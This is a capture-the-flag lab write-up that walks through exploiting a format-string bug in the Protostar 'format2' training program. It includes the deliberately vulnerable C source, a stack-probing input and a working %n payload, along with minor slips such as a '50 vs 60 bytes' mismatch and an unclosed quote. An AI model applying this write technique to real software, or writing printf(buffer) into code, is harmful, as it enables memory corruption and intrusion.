Let's take a look at the source code...

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

So looking at this code, it takes input via a fgets() function, then prints it out using a printf. Proceeding that it checks to 
see if the global int target it declared earlier is equal to 64.

So to exploit this, will will use the vulnerable printf function to write the value 64 to the target variable. To do this we will 
first need to find the address of target.

```
objdump -t ./format2 | grep target
080496e4 g  0 .bss  00000004    target
```

And we have the address of the target variable, which is 080496e4 (0x080496e4 if your displaying it as a proper hex). Next we 
need to find where the user defined date which will be printed is stored. To do that, we can use the vulnerable printf function
to print off values on the stack untill we see our data as hex using the x flag (in the example below I will have a period to
just seperate the hex values but it isn't needed).Since the data is taken in the same function as the printf, it shouldn't be 
too far away.

```
python -c 'print "0000" + "%x."*10 | ./format2
00002000.b7fd8420.bffffb84.30303030.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
target is 0 :(
```
And from there, we can see the hex value of 0000 (which is 30303030) located four bytes away. Now that we know where the user 
defined data is stored, we can go ahead and write to that data the address of the target variable using the n flag, and thus right to the variable.
Let's test our theory

```
python -c 'print "\xe4\x96\x04\x08%4$n"' | ./format2
target is 4 :(
````

So we did write to the target variable, however it took it as four. The reason for this being is 32 bit address (which is what we
wrote to it) are 4 bytes. Since we wrote 4 bytes to an int that is currently at 0, it took that as being 4. So to get the value
to 64, we just need to write 60 more bytes to it. We can do this by placing "%60x" in between the address, and our format string
to add 50 more bytes to it.

```
python -c 'print "\xe4\x96\x04\x08%60x%4$n"' | ./format2

you have modified the target :)
```

And just like that we pwned the program.

Sources:
http://thesprawl.org/research/exploit-exercises-protostar-format/#format-2
^great source, helped me alot with protostar





